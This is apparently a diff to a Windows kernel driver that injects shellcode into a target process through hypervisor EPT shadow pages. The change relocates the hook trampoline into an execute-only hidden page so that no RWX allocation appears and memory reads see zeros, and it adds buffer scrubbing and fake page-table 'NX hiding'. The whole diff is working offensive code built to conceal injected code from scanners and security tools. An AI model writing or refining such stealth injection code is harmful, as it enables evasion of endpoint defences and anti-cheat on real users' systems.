@@ -1248,12 +1248,17 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         DbgPrintEx(0, 0, "[td] inject: VA=%p size=0x%llX pid=%llu\n",
                    base, (UINT64)size, p->target_pid);
 
-        // --- step 1: allocate trampoline FIRST (need its VA for shellcode patch) ---
+        // --- step 1: allocate data page (PAGE_READWRITE, no execute) ---
+        //
+        // tramp_va holds ONLY data (+0x100). NO code — trampoline code lives
+        // inside the shadow page at offset 0xF00 (EPT X-only, hidden).
+        // PAGE_READWRITE: no RWX allocation, clean VAD.
+        //
         PVOID tramp_va = NULL;
         SIZE_T tramp_size = PAGE_SIZE;
         NTSTATUS tramp_st = ZwAllocateVirtualMemory(
             ZwCurrentProcess(), &tramp_va, 0, &tramp_size,
-            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
         if (!NT_SUCCESS(tramp_st) || !tramp_va)
         {
@@ -1265,11 +1270,7 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         }
         RtlZeroMemory(tramp_va, tramp_size);
 
-        // --- step 2: build data block on trampoline page (+0x100), then shellcode ---
-        //
-        // data on trampoline page (separate VA, normal RWX, NOT EPT hooked).
-        // shellcode code page will be execute-only (R=0) → reads see zeros.
-        //
+        // --- step 2: build data block on data page, then shellcode ---
         TdBuildDataBlock(tramp_va);
         TdBuildShellcodePage(base, (UINT64)tramp_va + 0x100);
 
@@ -1299,6 +1300,7 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         if (!base_phys)
         {
             ZwFreeVirtualMemory(ZwCurrentProcess(), &tramp_va, &tramp_size, MEM_RELEASE);
+            RtlSecureZeroMemory(fake_buf, PAGE_SIZE);
             ExFreePoolWithTag(fake_buf, 'kjnI');
             ZwFreeVirtualMemory(ZwCurrentProcess(), &base, &size, MEM_RELEASE);
             KeUnstackDetachProcess(&apc_state);
@@ -1307,13 +1309,18 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
             break;
         }
 
-        // --- step 4: build trampoline code + patch VMCALL on fake page ---
+        // --- step 4: build trampoline INSIDE fake page + patch VMCALL ---
+        //
+        // trampoline code at shadow page offset 0xF00 (NOT in tramp_va).
+        // HV redirects VMCALL → base+0xF00 → same page → EPT shadow → execute.
+        // tramp_va has NO code, only data. no RWX page exists.
+        //
         UINT32 hook_size = 4;  // sub rsp, 28h = 48 83 EC 28
 
-        // trampoline code at +0x000: [saved bytes] + [abs jmp back]
-        RtlCopyMemory(tramp_va, fake_buf, hook_size);
+        // write trampoline at fake_buf+0xF00: [saved bytes] + [abs jmp base+4]
+        RtlCopyMemory((PUINT8)fake_buf + 0xF00, fake_buf, hook_size);
         {
-            PUINT8 t = (PUINT8)tramp_va + hook_size;
+            PUINT8 t = (PUINT8)fake_buf + 0xF00 + hook_size;
             UINT64 dst = (UINT64)base + hook_size;
             t[0] = 0x68;
             *(PUINT32)(t + 1) = (UINT32)dst;
@@ -1327,7 +1334,7 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         ((PUINT8)fake_buf)[1] = 0x01;
         ((PUINT8)fake_buf)[2] = 0xC1;
 
-        DbgPrintEx(0, 0, "[td] inject: fake page + trampoline built, tramp=%p\n", tramp_va);
+        DbgPrintEx(0, 0, "[td] inject: trampoline at shadow+0xF00, data page=%p\n", tramp_va);
 
         // --- step 5b: pre-compute PT page info for fake PT / NX hiding ---
         //
@@ -1384,7 +1391,7 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         TD_HOOK_INJECT_PARAM inj_req = {};
         inj_req.target_va        = (UINT64)base;
         inj_req.target_phys      = base_phys;
-        inj_req.handler_va       = (UINT64)tramp_va;
+        inj_req.handler_va       = (UINT64)base + 0xF00;  // trampoline inside shadow page
         inj_req.fake_page_buffer = fake_buf;
         inj_req.hook_size        = hook_size;
         inj_req.force_read_access = FALSE;  // execute-only: reads → original page (zeros)
@@ -1399,8 +1406,9 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
             KeSignalCallDpcDone(A1);
         }, &inj_req);
 
+        RtlSecureZeroMemory(fake_buf, PAGE_SIZE);
         ExFreePoolWithTag(fake_buf, 'kjnI');
-        if (pt_page_buf) ExFreePoolWithTag(pt_page_buf, 'kjnI');
+        if (pt_page_buf) { RtlSecureZeroMemory(pt_page_buf, PAGE_SIZE); ExFreePoolWithTag(pt_page_buf, 'kjnI'); }
 
         if (inj_req.result)
         {
